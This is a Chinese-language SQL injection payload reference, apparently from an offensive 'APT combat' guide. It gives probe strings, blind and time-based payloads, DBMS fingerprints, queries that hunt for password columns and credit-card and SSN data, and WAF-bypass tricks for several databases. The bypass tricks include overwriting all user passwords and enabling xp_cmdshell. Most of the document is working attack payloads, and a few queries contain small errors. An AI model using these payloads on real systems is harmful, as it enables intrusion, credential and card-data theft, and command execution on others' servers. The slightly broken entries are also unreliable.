# SQL注入漏洞

## 1.注入点检测

（1）报错信息

特殊字符：

```bash
'
%27
"
%22
#
%23
;
%3B
)
||
*
--
/* */
&apos;
```

SQL语句：

```bash
'SELECT  //不成对的引号
1' OR '1' = '2  //逻辑错误
'1' = 1 --  //类型错误
'1' AND ASCII('a') = '97 --  //函数错误
'1' OR ('x'='x'  //操作符错误
```
(2)Boolean盲注

盲注检测：

|描述|查询语句|
|----|----|
|逻辑运算|page.php?id=1 or 1=1 -- 返回为true<br>page.php?id=1' or 1=1 -- 返回为true<br>page.php?id=1" or 1=1 -- 返回为true<br>page.php?id=1 and 1=2 -- 返回为false|
|数学运算|page.php?id=1/1 -- 返回为true<br>page.php?id=1/0 -- 返回为false<br>page.php?id=1/abs(1) -- 返回为true<br>page.php?id=1/abf(1) -- 返回为false|

逻辑运算字典：

[sql_logic](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sqli-logic.txt)

(3)时间盲注

MySQL：

```sql
1' + sleep(5)
1' and sleep(5)
1' && sleep(5)
1' | sleep(5)
```

PostgreSQL:

```sql
1' and pg_sleep(5)
1' || pg_sleep(5)
```

SQL Server:

```sql
1' WAITFOR DELAY '0:0:5'
1' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (SELECT SLEEP(5)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CHAR(109,97,115,116,101,114)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

Oracle:

```sql
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)
1' AND DBMS_LOCK.SLEEP(5)
```

SQLite:

```sql
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## 2.DBMS识别

MySQL识别：
|描述|查询语句|
|----|----|
|睡眠|id=1'-SLEEP(1)=0 LIMIT 1 --|
|BENCHMARK|id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --|
|字符串拼接|id=' 'mysql' –<br>'my' 'sql'<br>CONCAT('my','sql')|
|函数|connection_id() --<br>row_count() --<br>POW(1,1) --|
|错误信息|id='|
|默认变量|@@version_compile_os<br>@@version<br>@@basedir<br>@@datadir|
|比较函数|conv('a',16,2)=conv('a',16,2)<br>connection_id()=connection_id()<br>crc32('MySQL')=crc32('MySQL')|

Oracle识别：
|描述|查询语句|
|----|----|
|字符串拼接|id='\|\|'oracle' --|
|函数|BITAND(1,1) –|
|默认表|id='UNION SELECT 1 FROM v$version --|
|错误信息|id='|
|睡眠|dbms_pipe.receive_message(('a'),10)|
|默认变量|SELECT banner FROM v$version<br>SELECT version FROM v$instance|
|比较函数|ROWNUM=ROWNUM<br>RAWTOHEX('AB')=RAWTOHEX('AB')|

SQL Server识别：
|描述|查询语句|
|----|----|
|睡眠|id=';WAITFOR DELAY '00:00:10'; --|
|字符串拼接|id='mssql'+'mssql' --|
|函数|@@rowcount --<br>SQUARE(1) --<br>@@pack_received --|
|默认变量|id=sql'; SELECT @@SERVERNAME --|
|错误信息|id='<br>id=@@SERVERNAME<br>id=0/@@SERVERNAME|
|比较函数|BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)<br>@@CONNECTIONS>0<br>@@CONNECTIONS=@@CONNECTIONS|

PostgreSQL识别：
|描述|查询语句|
|----|----|
|睡眠|SELECT pg_sleep(10)|
|字符串拼接|'foo'\|\|'bar'|
|默认变量|SELECT version()|
|错误信息|1 = (select case when (条件语句) then 1/(select 0) else null end)|
|比较函数|pg_client_encoding()=pg_client_encoding()<br>get_current_ts_config()=get_current_ts_config()<br>quote_literal(42.5)=quote_literal(42.5)<br>current_database()=current_database()|

这里放置一个来自[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)的表：
```sql
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## 3.注入类型

(1)MySQL

[MySQL注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/MySQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B.md)

(2)Oracle

[Oracle注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/Oracle%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B.md)

(3)SQL Server

[SQL Server注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/SQL%20Server%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B.md)

(4)PostgreSQL

[PostgreSQL注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/PostgreSQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B.md)

(5)BigQuery

[BigQuery注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/BigQuery%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B.md)

(6)Cassandra

[Cassandra注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/Cassandra.md)

(7)DB2

[DB2注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/DB2.md)

(8)HQL

[HQL注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/HQL.md)

(9)SQLite

[SQLite注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/SQLite.md)

## 4.身份验证绕过

Payload:

[login_bypass](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass.txt)<br>
[login_bypass2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass2.txt)<br>

## 5.数据定位

MySQL：
|描述|查询语句|
|----|----|
|数据库大小|SELECT table_schema “数据库名称",sum( data_length + index_length ) / 1024 / 1024 “数据库大小MB",sum( data_free )/ 1024 / 1024 “可用空间MB" FROM information_schema.TABLES GROUP BY table_schema ;|
|关键字数据库|SELECT table_schema “数据库名称" FROM information_schema.TABLES WHERE table_schema LIKE “%passwords%" GROUP BY table_schema ;|
|关键字表名|SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE “information_schema" AND table_name LIKE “%admin%“;|
|关键字列名|SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE “%password%“;|
|正则表达式匹配列值|SELECT * from 表名 WHERE cc_number REGEXP '^4[0-9]{15}$';|

Oracle:
|描述|查询语句|
|----|----|
|查找敏感数据|SELECT owner,table_name,column_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';|
|查找特殊权限|SELECT * FROM session_privs<br>SELECT * FROM USER_SYS_PRIVS<br>SELECT * FROM USER_TAB_PRIVS<br>SELECT * FROM USER_TAB_PRIVS_MADE<br>SELECT * FROM USER_TAB_PRIVS_RECD<br>SELECT * FROM ALL_TAB_PRIVS<br>SELECT * FROM USER_ROLE_PRIVS|
|提取存储过程|SELECT * FROM all_source WHERE owner NOT IN ('SYS','SYSTEM')<br>SELECT * FROM all_source WHERE TYPE LIKE '%JAVA %'<br>SELECT TO_CHAR(DBMS_METADATA.get_ddl('TABLE','DEPT','CONSUELA')) FROM dual|
|正则表达式|\^(?:4[0-9]{12}(?:[0-9]{3})?\|(?:5[1-5][0-9]{2}\|222[1-9]\|22[3-9][0-9]\|2[3-6][0-9]{2}\|27[01][0-9]\|2720)[0-9]{12}\|3[47][0-9]{13}\|3(?:0[0-5]\|[68][0-9])[0-9]{11}\|6(?:011\|5[0-9]{2})[0-9]{12}\|(?:2131\|1800\|35\d{3})\d{11})$<br>^(\d{3}-?\d{2}-?\d{4}\|XXX-XX-XXXX)$|

SQL Server:
|描述|查询语句|
|----|----|
|列出非默认数据库|SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE 'distribution') AND (NAME NOT LIKE 'master') AND (NAME NOT LIKE 'model') AND (NAME NOT LIKE 'msdb') AND (NAME NOT LIKE 'publication') AND (NAME NOT LIKE 'reportserver') AND (NAME NOT LIKE 'reportservertempdb') AND (NAME NOT LIKE 'resource') AND (NAME NOT LIKE 'tempdb') ORDER BY NAME;|
|列出非默认数据表|SELECT '[' + SCHEMA_NAME(t.schema_id) + '].[' + t.name + ']' AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid < 2 WHERE (ROWS> 0) AND (t.name NOT LIKE 'syscolumns') AND (t.name NOT LIKE 'syscomments') AND (t.name NOT LIKE 'sysconstraints') AND (t.name NOT LIKE 'sysdepends') AND (t.name NOT LIKE 'sysfilegroups') AND (t.name NOT LIKE 'sysfiles') AND (t.name NOT LIKE 'sysforeignkeys') AND (t.name NOT LIKE 'sysfulltextcatalogs') AND (t.name NOT LIKE 'sysindexes') AND (t.name NOT LIKE 'sysindexkeys') AND (t.name NOT LIKE 'sysmembers') AND (t.name NOT LIKE 'sysobjects') AND (t.name NOT LIKE 'syspermissions') AND (t.name NOT LIKE 'sysprotects') AND (t.name NOT LIKE 'sysreferences') AND (t.name NOT LIKE 'systypes') AND (t.name NOT LIKE 'sysusers') ORDER BY TABLE_NAME;|
|列出非默认列|SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH > 14 AND DATA_TYPE NOT IN ('bigint','binary','bit','cursor','date','datetime','datetime2', 'datetimeoffset','float','geography','hierarchyid','image','int','money','real', 'smalldatetime','smallint','smallmoney','sql_variant','table','time','timestamp', 'tinyint','uniqueidentifier','varbinary','xml') AND TABLE_NAME='CreditCard' OR CHARACTER_MAXIMUM_LENGTH < 1 AND DATA_TYPE NOT IN ( 'bigint', 'binary', 'bit', 'cursor', 'date', 'datetime', 'datetime2', 'datetimeoffset', 'float', 'geography', 'hierarchyid', 'image', 'int', 'money', 'real', 'smalldatetime', 'smallint', 'smallmoney', 'sql_variant', 'table', 'time', 'timestamp', 'tinyint', 'uniqueidentifier', 'varbinary', 'xml') AND TABLE_NAME='CreditCard' ORDER BY COLUMN_NAME;|
|列名搜索|SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like '%password%'|
|搜索透明加密|SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1|
|按数据库大小搜索|SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC|
|正则表达式|\^(?:4[0-9]{12}(?:[0-9]{3})?\|(?:5[1-5][0-9]{2}\|222[1-9]\|22[3-9][0-9]\|2[3-6][0-9]{2}\|27[01][0-9]\|2720)[0-9]{12}\|3[47][0-9]{13}\|3(?:0[0-5]\|[68][0-9])[0-9]{11}\|6(?:011\|5[0-9]{2})[0-9]{12}\|(?:2131\|1800\|35\d{3})\d{11})$<br>^(\d{3}-?\d{2}-?\d{4}\|XXX-XX-XXXX)$|

## 6.读写文件

MySQL:

[MySQL读写文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/MySQL.md)

SQL Server

[SQL Server读写文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/SQL%20Server.md)

PostgreSQL:

[PostgreSQL读写文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/PostgreSQL.md)

## 7.命令执行

MySQL:

[MySQL命令执行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/MySQL.md)

Oracle:

[Oracle命令执行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Oracle.md)

SQL Server:

[SQL Server命令执行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/SQL%20Server.md)

PostgreSQL:

[PostgreSQL命令执行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/PostgreSQL.md)

SQLite:

[SQLite命令执行](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/SQLite.md)

## 8.提权

Oracle:

[Oracle提权](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8F%90%E6%9D%83/Oracle.md)

SQL Server:

[SQL Server提权](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8F%90%E6%9D%83/SQL%20Server.md)

PostgreSQL:

[PostgreSQL提权](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8F%90%E6%9D%83/PostgreSQL.md)

## 9.持久化

MySQL

[MySQL持久化](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8C%81%E4%B9%85%E5%8C%96/MySQL.md)

SQL Server

[SQL Server持久化](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8C%81%E4%B9%85%E5%8C%96/SQL%20Server.md)

Oracle

[Oracle持久化](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8C%81%E4%B9%85%E5%8C%96/Oracle.md)

PostgreSQL

[PostgreSQL持久化](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/%E6%8C%81%E4%B9%85%E5%8C%96/PostgreSQL.md)

## 10.WAF绕过

### 通用绕过

空格绕过

```sql
替代空格绕过
id=1%09and%091=1%09--
id=1%0Dand%0D1=1%0D--
id=1%0Cand%0C1=1%0C--
id=1%0Band%0B1=1%0B--
id=1%0Aand%0A1=1%0A--
id=1%A0and%A01=1%A0—

注释绕过
id=1/*comment*/and/**/1=1/**/--

括号绕过
id=(1)and(1)=(1)--
```

|DBMS|ASCII字符|
|----|----|
|MySQL V3|01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
|MySQL V5|09, 0A, 0B, 0C, 0D, A0, 20|
|Oracle V11g|00, 0A, 0D, 0C, 09, 20|
|SQL Server|01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20|
|SQLite V3|0A, 0D, 0C, 09, 20|
|PostgreSQL|0A, 0D, 0C, 09, 20|

逗号绕过

```sql
LIMIT 0,1 --> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) --> SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3 --> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

逻辑运算符
select user from users WHERE (user_id=1) union select password from users where (user_id=1);

编码
SELECT%20user_id%2Cpassword%20FROM%20users;

多个字符混淆导致无法正确处理逗号
SELECT user/**/,password/**/FROM users where user_id = 1;
```

等于号绕过

```sql
like替代
substr(database(),1,1)='d' --> substr(database(),1,1)like('d')

正则表达式
='d' --> REGEXP '^d$'

BETWEEN条件运算
select user from users where user_id = 1 and substr(database(),1,1) between 'a' and 'z';

in 和 not in
```

字符串修改

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#

and --> &&
or --> ||
= --> LIKE,REGEXP, BETWEEN, not < and not >
> X --> not between 0 and X
WHERE --> HAVING
```

### MySQL

#### 列名称限制绕过

```sql
SELECT F.4 FROM (SELECT 1,2,3,4,5,6,7,8 UNION SELECT * FROM users)F;
```

#### 科学计数法

```sql
' or 1e0=1
' or 1e000001 - 1e000001=0
' or (1e1 / 2e0) = 5
```

### SQL Server

#### 非标准空白字符
```sql
?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

#### UNION、科学计数法和十六进制的混淆
```sql
?id=0eunion+select+null,@@version,null--
?id=0xunion+select+null,@@version,null--
```

#### from和列中间无空格
```sql
?id=1+union+select+null,@@version,null+from.users--
```

#### select查询之间的\分隔符
```sql
?id=0xunion+select\Nnull,@@version,null+from+users--
```

#### 非正统的堆叠查询
```sql
SELECT 'a' SELECT 'b'
```

例如多个查询：
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

简化为:
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

#### 在末尾添加无用的exec()，使waf认为是无效查询
```sql
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'
```

#### 使用奇怪的查询
```
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'
```

#### 启用 xp_cmdshell
```sql
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

### PostgreSQL

#### 引号替换

```sql
SELECT CHR(65)||CHR(66)||CHR(67);
```

#### 使用$(>= PostgreSQL 版本 8)

```sql
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```

#### 堆叠查询

通过时间延迟滥用堆叠查询
```sql
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```

#### XML

查询到XML中
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```

数据库以XML格式转储
```sql
SELECT database_to_xml(true,true,'');
```

#### 十六进制字符串

```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
